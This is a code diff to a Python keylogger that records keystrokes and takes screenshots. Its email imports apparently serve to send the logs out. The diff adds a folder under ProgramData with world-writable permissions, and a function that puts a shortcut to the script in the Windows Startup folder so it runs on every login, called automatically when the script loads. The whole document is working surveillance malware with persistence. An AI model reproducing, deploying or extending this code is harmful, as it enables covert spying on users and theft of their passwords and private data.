@@ -1,8 +1,9 @@
 from pynput import keyboard
 from datetime import date, datetime, timedelta
 import pyautogui
-from win_file import create_folder
 import email, smtplib, ssl
+import os
+import win32com.client
 
 from email import encoders
 from email.mime.base import MIMEBase
@@ -12,6 +13,44 @@ from email.mime.text import MIMEText
 keys = []
 curr_date = date.today()
 date_str = curr_date.strftime("%d-%m-%Y")
+
+def win_create_folder():
+    # Path to the folder in ProgramData directory
+    folder_path = os.path.join(os.environ['ProgramData'], 'logger')
+    ss_path = os.path.join(folder_path, 'screenshots')
+    logs_path = os.path.join(folder_path, 'logs')
+
+    # Create the folder if it doesn't exist
+    if not os.path.exists(folder_path):
+        os.makedirs(folder_path)
+        os.makedirs(ss_path)
+        os.makedirs(logs_path)
+
+    # Set the folder's access permissions to 0o777
+    os.chmod(folder_path, 0o777)
+
+    return folder_path
+
+def win_replicate():
+    # Get the path to the script's directory
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+
+    # Get the path to the Startup folder
+    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+    # Get the path to the Python script
+    script_path = os.path.abspath(__file__)
+
+    # Create a shortcut to the script in the Startup folder
+    shortcut_path = os.path.join(startup_folder, 'MyScriptName.lnk')
+    target_path = script_path
+    icon_path = script_path # Set the icon path to the script path to use the script icon
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(shortcut_path)
+    shortcut.Targetpath = target_path
+    shortcut.IconLocation = icon_path
+    shortcut.WorkingDirectory = script_dir # Set the working directory to the script's directory
+    shortcut.save()
 
 def on_press(key):
     keys.append(key)
@@ -32,7 +71,7 @@ def on_release(key):
         return False
     
 def write_file(keys):
-    path = create_folder() 
+    path = win_create_folder() 
 
     with open(f'{path}/logs/{date_str}.log', 'w') as f:
         for key in keys:
@@ -45,13 +84,15 @@ def write_file(keys):
             f.write(' ')
 
 def screenshot():
-    path = create_folder()
+    path = win_create_folder()
     
     curr_date_time = datetime.now()
     dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
     
     ss = pyautogui.screenshot()
     ss.save(f'{path}/screenshots/{dt_string}.jpg')
+
+win_replicate()
 
 # Start up the listener
 listener = keyboard.Listener(
